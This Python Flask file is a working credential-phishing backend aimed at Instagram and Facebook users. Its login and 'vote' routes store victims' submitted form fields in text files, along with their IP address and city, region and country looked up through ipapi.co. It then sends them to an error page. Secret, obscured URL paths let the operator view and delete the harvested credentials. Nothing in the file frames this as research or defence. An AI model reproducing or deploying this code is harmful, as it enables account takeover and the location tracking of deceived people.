from flask import Flask, redirect, request, render_template
import os
from datetime import datetime
from json import dumps,loads
import requests

##################### CONFIGURATION ##########################

REDIRECT_URL = 'error' ## site to redirect to
REDIRECT_URL2 = 'error' ## site to redirect to
locate = "suobyiyUnvL99f/"
locate2 = "7wHFjPBSVisuob/"
view=os.getenv('USER')

###############################################################


app = Flask(__name__)

@app.errorhandler(404)
def page_not_found(e):

    return '404 Not Found'


##########################First LG##########################


@app.route('/login/', methods=["GET","POST"])
def login_page():

    if request.method == "POST":
        ip_address=request.headers['X-Real-IP']
        response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()

        alldata = {i+": ": request.form[i] for i in request.form}


        alldata.update({
            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
            'account type: ': "INSTAGRAM",
            'ip: ': ip_address,
            "city: ": response.get("city"),
            "region: ": response.get("region"),
            "country: ": response.get("country_name")
            })

        with open('creds.txt', 'r+') as creds:
            content = creds.read()
            creds.seek(0, 0)
            creds.write(dumps(alldata).rstrip('\r\n') + '\n' + content)
            #creds.write(dumps(alldata)+'\n')


    return redirect(request.referrer + "error")

@app.route('/login2/', methods=["GET","POST"])
def login_page2():

    if request.method == "POST":
        ip_address=request.headers['X-Real-IP']
        response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()

        alldata = {i+": ": request.form[i] for i in request.form}


        alldata.update({
            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
            'account type: ': "FACEBOOK",
            'ip: ': ip_address,
            "city: ": response.get("city"),
            "region: ": response.get("region"),
            "country: ": response.get("country_name")
            })

        with open('creds.txt', 'r+') as creds:
            content = creds.read()
            creds.seek(0, 0)
            creds.write(dumps(alldata).rstrip('\r\n') + '\n' + content)
            #creds.write(dumps(alldata)+'\n')



    return redirect(request.referrer + "error")

@app.route("/" + locate)
def index():
    with open('creds.txt', 'r') as creds:
        data =  creds.read().splitlines()


    return render_template('index.html',data=data,loads=loads,locate=locate,view=view)




@app.route("/delete" + locate + "<lineno>")
def delete(lineno):
    # list to store file lines
    lines = []
    # read file
    with open("creds.txt", 'r') as fp:
        # read an store all lines into list
        lines = fp.readlines()

    # Write file
    with open("creds.txt", 'w') as fp:
        # iterate each line
        for number, line in enumerate(lines):
            # delete line 5 and 8. or pass any Nth line you want to remove
            # note list index starts from 0
            if number not in [int(lineno)]:
                fp.write(line)


    return redirect('https://'+view+'.pythonanywhere.com/' + locate)
##########################Second LG##########################

@app.route('/vote/', methods=["GET","POST"])
def vote_page():

    if request.method == "POST":
        ip_address=request.headers['X-Real-IP']
        response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()

        alldata = {i+": ": request.form[i] for i in request.form}


        alldata.update({
            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
            'account type: ': "INSTAGRAM",
            'ip: ': ip_address,
            "city: ": response.get("city"),
            "region: ": response.get("region"),
            "country: ": response.get("country_name")
            })

        with open('creds2.txt', 'r+') as creds2:
            content = creds2.read()
            creds2.seek(0, 0)
            creds2.write(dumps(alldata).rstrip('\r\n') + '\n' + content)



    return redirect(request.referrer + "error")

@app.route('/vote2/', methods=["GET","POST"])
def vote_page2():

    if request.method == "POST":
        ip_address2=request.headers['X-Real-IP']
        response2 = requests.get(f'https://ipapi.co/{ip_address2}/json/').json()

        alldata2 = {i+": ": request.form[i] for i in request.form}


        alldata2.update({
            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
            'account type: ': "FACEBOOK",
            'ip: ': ip_address2,
            "city: ": response2.get("city"),
            "region: ": response2.get("region"),
            "country: ": response2.get("country_name")
            })

        with open('creds2.txt', 'r+') as creds2:
            content = creds2.read()
            creds2.seek(0, 0)
            creds2.write(dumps(alldata2).rstrip('\r\n') + '\n' + content)



    return redirect(request.referrer + "error")

@app.route("/"+locate2)
def index2():
    with open('creds2.txt', 'r') as creds2:
        data2 =  creds2.read().splitlines()


    return render_template('index2.html',data=data2,loads=loads,locate2=locate2,view=view)




@app.route("/delete" + locate2 + "<lineno2>")
def delete2(lineno2):
    # list to store file lines
    lines2 = []
    # read file
    with open("creds2.txt", 'r') as fp2:
        # read an store all lines into list
        lines2 = fp2.readlines()

    # Write file
    with open("creds2.txt", 'w') as fp2:
        # iterate each line
        for number2, line2 in enumerate(lines2):
            # delete line 5 and 8. or pass any Nth line you want to remove
            # note list index starts from 0
            if number2 not in [int(lineno2)]:
                fp2.write(line2)


    return redirect('https://'+view+'.pythonanywhere.com/' + locate2)
